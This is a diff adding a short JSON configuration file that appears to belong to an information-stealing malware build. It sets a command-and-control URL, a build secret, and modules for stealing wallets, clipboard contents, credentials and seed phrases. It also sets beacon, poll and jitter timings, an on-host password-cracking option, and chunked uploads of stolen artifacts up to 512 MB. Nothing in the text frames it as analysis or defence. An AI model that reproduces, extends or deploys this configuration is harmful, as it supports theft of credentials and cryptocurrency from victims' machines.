@@ -1,0 +1,14 @@
+{
+  "schema": 1,
+  "build_id": "00000000-0000-4000-8000-00000000a001",
+  "build_secret": "KkkJJGQGZ6SIvCvxsQgl1YDF8Lm2ne35qErepvxoR-0",
+  "c2_base": "https://c2.spc-cloud.net/api/v1",
+  "profile": "full",
+  "modules": { "wallets": true, "clipboard": true, "credentials": true, "seeds": true },
+  "bandwidth_kbps": 1024,
+  "heartbeat_sec": 30,
+  "poll_sec": 20,
+  "jitter_pct": 20,
+  "crack": { "enabled": true, "max_seconds": 90, "max_cpu_pct": 50 },
+  "artifact": { "chunk_size": 524288, "max_mb": 512 }
+}
